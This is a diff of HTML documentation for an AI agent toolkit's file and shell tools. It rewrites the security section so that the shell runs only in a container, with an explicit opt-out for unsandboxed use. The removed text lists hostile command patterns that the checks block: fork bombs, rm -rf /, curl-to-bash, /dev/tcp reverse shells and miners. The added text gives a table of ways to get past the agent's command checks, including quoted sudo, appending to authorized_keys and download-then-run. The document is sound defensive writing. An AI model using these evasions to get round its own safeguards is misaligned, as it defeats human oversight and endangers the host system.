@@ -1355,6 +1355,23 @@
     </span>
   </a>
   
+    <nav class="md-nav" aria-label="Security Model">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-the-command-checks-are-and-are-not" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What the command checks are, and are not
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -1395,7 +1412,7 @@ system. They are provided as a standalone module — import and pass them via <c
 <div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">flux</span><span class="w"> </span><span class="kn">import</span> <span class="n">workflow</span><span class="p">,</span> <span class="n">ExecutionContext</span>
 <a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">flux.tasks.ai</span><span class="w"> </span><span class="kn">import</span> <span class="n">agent</span><span class="p">,</span> <span class="n">system_tools</span>
 <a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
-<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nd">@workflow</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nd">@workflow</span><span class="o">.</span><span class="n">with_options</span><span class="p">(</span><span class="n">runner</span><span class="o">=</span><span class="s2">&quot;docker&quot;</span><span class="p">)</span>     <span class="c1"># shell requires a container</span>
 <a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">autonomous_agent</span><span class="p">(</span><span class="n">ctx</span><span class="p">:</span> <span class="n">ExecutionContext</span><span class="p">):</span>
 <a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>    <span class="n">tools</span> <span class="o">=</span> <span class="n">system_tools</span><span class="p">(</span><span class="n">workspace</span><span class="o">=</span><span class="s2">&quot;/path/to/project&quot;</span><span class="p">)</span>
 <a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>
@@ -1414,7 +1431,9 @@ system. They are provided as a standalone module — import and pass them via <c
 <a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>    <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span>                     <span class="c1"># Shell timeout in seconds (default: 30).</span>
 <a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>    <span class="n">blocklist</span><span class="o">=</span><span class="kc">None</span><span class="p">,</span>                 <span class="c1"># Shell blocklist patterns (None = defaults).</span>
 <a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>    <span class="n">max_output_chars</span><span class="o">=</span><span class="mi">100_000</span><span class="p">,</span>       <span class="c1"># Truncate responses to LLM (default: 100K).</span>
-<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="p">)</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>    <span class="n">include_shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>             <span class="c1"># False builds only file/search/directory tools.</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>    <span class="n">allow_unsandboxed_shell</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>  <span class="c1"># True builds shell without a container.</span>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="p">)</span>
 </code></pre></div>
 <h3 id="parameters">Parameters<a class="headerlink" href="#parameters" title="Permanent link">&para;</a></h3>
 <ul>
@@ -1516,94 +1535,80 @@ any attempt to escape (e.g., <code>../</code>) returns an error.</p>
 <h2 id="security-model">Security Model<a class="headerlink" href="#security-model" title="Permanent link">&para;</a></h2>
 <p><strong>File tools</strong> are sandboxed to the workspace directory. Paths are resolved and checked —
 symlink escapes, <code>../</code> traversals, and absolute paths outside workspace are all rejected.</p>
-<p><strong>Shell</strong> has a two-layer security model:</p>
-<ol>
-<li><strong>Baseline security checks</strong> (non-overridable) — 12 hardcoded checks that always run
-   before any command executes. These cannot be disabled and protect against:</li>
-</ol>
+<p><strong>Shell requires a container.</strong> <code>system_tools()</code> refuses to build it unless the
+execution is containerized, because outside one it runs as the worker user —
+with that user's ssh keys, cloud credentials and <code>flux.toml</code>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nd">@workflow</span><span class="o">.</span><span class="n">with_options</span><span class="p">(</span><span class="n">runner</span><span class="o">=</span><span class="s2">&quot;docker&quot;</span><span class="p">)</span>      <span class="c1"># or &quot;docker-airgapped&quot;</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">my_agent</span><span class="p">(</span><span class="n">ctx</span><span class="p">:</span> <span class="n">ExecutionContext</span><span class="p">):</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>    <span class="n">tools</span> <span class="o">=</span> <span class="n">system_tools</span><span class="p">(</span><span class="n">workspace</span><span class="o">=</span><span class="s2">&quot;./workspace&quot;</span><span class="p">)</span>
+</code></pre></div>
+<p>For an agent driven through the built-in <code>agents/agent_chat</code> template, the
+runner is the worker's choice rather than the workflow's — set it on the
+workers that run agents:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="k">[flux.workers]</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="n">runners</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;subprocess&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;docker&quot;</span><span class="p">]</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="n">default_runner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;docker&quot;</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="n">docker_image</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;my-registry/flux:1.2.3&quot;</span>
+</code></pre></div>
+<p>The container runners set <code>FLUX_RUNNER_SANDBOXED=1</code> in the child; the tool reads
+it. For local development, opt out explicitly:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">tools</span> <span class="o">=</span> <span class="n">system_tools</span><span class="p">(</span><span class="n">workspace</span><span class="o">=</span><span class="s2">&quot;./workspace&quot;</span><span class="p">,</span> <span class="n">allow_unsandboxed_shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</code></pre></div>
+<p>Pass <code>include_shell=False</code> to build the file, search and directory tools without
+it — those enforce the workspace boundary themselves and need no container.</p>
+<h3 id="what-the-command-checks-are-and-are-not">What the command checks are, and are not<a class="headerlink" href="#what-the-command-checks-are-and-are-not" title="Permanent link">&para;</a></h3>
+<p><code>run_security_checks</code> runs twelve pattern checks (fork bombs, <code>rm -rf /</code>,
+pipe-to-shell, privilege escalation and so on), and a configurable <code>blocklist</code>
+adds organization-specific patterns.</p>
+<p><strong>They are speed bumps, not a boundary.</strong> The checks match the raw command
+string; <code>/bin/sh -c</code> performs quote removal, word splitting and expansion
+before anything executes, so the same command can be written to evade them:</p>
 <table>
 <thead>
 <tr>
-<th>Check</th>
-<th>Threats</th>
+<th>Written as</th>
+<th>Why the check misses it</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>Fork bomb</td>
-<td><code>:(){ :|:&amp; };:</code>, <code>while true</code>, <code>for(;;)</code></td>
+<td><code>s'u'do -n id</code></td>
+<td>the privilege-escalation check needs a contiguous <code>sudo</code></td>
 </tr>
 <tr>
-<td>Destructive commands</td>
-<td><code>rm -rf /</code>, <code>mkfs</code>, <code>dd if=/dev/zero</code>, <code>wipefs</code></td>
+<td><code>cd $HOME/.ssh &amp;&amp; echo … &gt;&gt; authorized_keys</code></td>
+<td>the protected-files check needs the path adjacent to the redirect</td>
 </tr>
 <tr>
-<td>System control</td>
-<td><code>shutdown</code>, <code>reboot</code>, <code>halt</code>, <code>init 0/6</code></td>
+<td><code>curl -s http://host/x -o p &amp;&amp; sh p</code></td>
+<td>the pipe-to-shell check needs a literal <code>\|</code></td>
 </tr>
 <tr>
-<td>Protected files</td>
-<td>Writes to <code>.env</code>, <code>.ssh/</code>, <code>.bashrc</code>, <code>.gitconfig</code>, credentials</td>
-</tr>
-<tr>
-<td>Path traversal</td>
-<td><code>../</code> sequences, URL-encoded <code>%2e%2e</code> variants</td>
-</tr>
-<tr>
-<td>Pipe to shell</td>
-<td><code>curl \| bash</code>, <code>wget \| sh</code>, download-and-execute patterns</td>
-</tr>
-<tr>
-<td>Unicode injection</td>
-<td>Zero-width spaces, right-to-left override, control characters</td>
-</tr>
-<tr>
-<td>IFS injection</td>
-<td><code>IFS=</code> manipulation, null-byte injection</td>
-</tr>
-<tr>
-<td>Env manipulation</td>
-<td><code>PATH=</code>, <code>LD_PRELOAD=</code>, <code>PYTHONPATH=</code> overrides</td>
-</tr>
-<tr>
-<td>Privilege escalation</td>
-<td><code>sudo</code>, <code>su</code>, <code>chmod 777</code>, <code>chmod +s</code>, <code>chown root</code></td>
-</tr>
-<tr>
-<td>Network exfiltration</td>
-<td><code>nc -l</code>, reverse shells via <code>/dev/tcp/</code>, <code>socat</code> listeners</td>
-</tr>
-<tr>
-<td>Crypto mining</td>
-<td><code>xmrig</code>, <code>minerd</code>, <code>cpuminer</code>, <code>stratum+tcp://</code></td>
+<td><code>awk 'BEGIN{system("id")}'</code></td>
+<td>matches no check at all</td>
 </tr>
 </tbody>
 </table>
-<p>Blocked commands return a descriptive error (e.g., <code>"fork bomb detected"</code>) without
-   executing.</p>
-<ol>
-<li><strong>Configurable blocklist</strong> — regex patterns for organization-specific rules. Override
-   with <code>blocklist=[]</code> to disable the configurable layer (baseline checks still apply).</li>
-</ol>
-<p>For stronger isolation, run your Flux workflow inside a Docker container.</p>
+<p>Treat them as protection against mistakes, not against an adversary. The
+container is what bounds a determined command, which is why shell needs one.</p>
 <h2 id="composing-with-other-tools">Composing With Other Tools<a class="headerlink" href="#composing-with-other-tools" title="Permanent link">&para;</a></h2>
 <p>System tools are a plain <code>list[task]</code> — combine them with your own tools:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nd">@task</span>
-<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">query_database</span><span class="p">(</span><span class="n">sql</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
-<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Run a SQL query against the database.&quot;&quot;&quot;</span>
-<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>    <span class="c1"># ...</span>
-<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>
-<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="n">tools</span> <span class="o">=</span> <span class="n">system_tools</span><span class="p">(</span><span class="n">workspace</span><span class="o">=</span><span class="s2">&quot;/path/to/project&quot;</span><span class="p">)</span>
-<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="n">assistant</span> <span class="o">=</span> <span class="k">await</span> <span class="n">agent</span><span class="p">(</span>
-<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>    <span class="s2">&quot;You are an assistant with access to the codebase and a database.&quot;</span><span class="p">,</span>
-<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>    <span class="n">model</span><span class="o">=</span><span class="s2">&quot;openai/gpt-4o&quot;</span><span class="p">,</span>
-<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>    <span class="n">tools</span><span class="o">=</span><span class="n">tools</span> <span class="o">+</span> <span class="p">[</span><span class="n">query_database</span><span class="p">],</span>
-<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="p">)</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nd">@task</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="k">async</span> <span class="k">def</span><span class="w"> </span><span class="nf">query_database</span><span class="p">(</span><span class="n">sql</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Run a SQL query against the database.&quot;&quot;&quot;</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>    <span class="c1"># ...</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="n">tools</span> <span class="o">=</span> <span class="n">system_tools</span><span class="p">(</span><span class="n">workspace</span><span class="o">=</span><span class="s2">&quot;/path/to/project&quot;</span><span class="p">,</span> <span class="n">allow_unsandboxed_shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="n">assistant</span> <span class="o">=</span> <span class="k">await</span> <span class="n">agent</span><span class="p">(</span>
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>    <span class="s2">&quot;You are an assistant with access to the codebase and a database.&quot;</span><span class="p">,</span>
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>    <span class="n">model</span><span class="o">=</span><span class="s2">&quot;openai/gpt-4o&quot;</span><span class="p">,</span>
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>    <span class="n">tools</span><span class="o">=</span><span class="n">tools</span> <span class="o">+</span> <span class="p">[</span><span class="n">query_database</span><span class="p">],</span>
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a><span class="p">)</span>
 </code></pre></div>
 <p>To select specific tools:</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">tools</span> <span class="o">=</span> <span class="n">system_tools</span><span class="p">(</span><span class="n">workspace</span><span class="o">=</span><span class="s2">&quot;/path/to/project&quot;</span><span class="p">)</span>
-<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="n">shell_only</span> <span class="o">=</span> <span class="p">[</span><span class="n">t</span> <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">tools</span> <span class="k">if</span> <span class="n">t</span><span class="o">.</span><span class="n">func</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;shell&quot;</span><span class="p">]</span>
-<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="n">file_tools</span> <span class="o">=</span> <span class="p">[</span><span class="n">t</span> <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">tools</span> <span class="k">if</span> <span class="n">t</span><span class="o">.</span><span class="n">func</span><span class="o">.</span><span class="vm">__name__</span> <span class="ow">in</span> <span class="p">(</span><span class="s2">&quot;read_file&quot;</span><span class="p">,</span> <span class="s2">&quot;write_file&quot;</span><span class="p">,</span> <span class="s2">&quot;edit_file&quot;</span><span class="p">)]</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">tools</span> <span class="o">=</span> <span class="n">system_tools</span><span class="p">(</span><span class="n">workspace</span><span class="o">=</span><span class="s2">&quot;/path/to/project&quot;</span><span class="p">,</span> <span class="n">allow_unsandboxed_shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="n">shell_only</span> <span class="o">=</span> <span class="p">[</span><span class="n">t</span> <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">tools</span> <span class="k">if</span> <span class="n">t</span><span class="o">.</span><span class="n">func</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;shell&quot;</span><span class="p">]</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="n">file_tools</span> <span class="o">=</span> <span class="p">[</span><span class="n">t</span> <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">tools</span> <span class="k">if</span> <span class="n">t</span><span class="o">.</span><span class="n">func</span><span class="o">.</span><span class="vm">__name__</span> <span class="ow">in</span> <span class="p">(</span><span class="s2">&quot;read_file&quot;</span><span class="p">,</span> <span class="s2">&quot;write_file&quot;</span><span class="p">,</span> <span class="s2">&quot;edit_file&quot;</span><span class="p">)]</span>
 </code></pre></div>
 
 
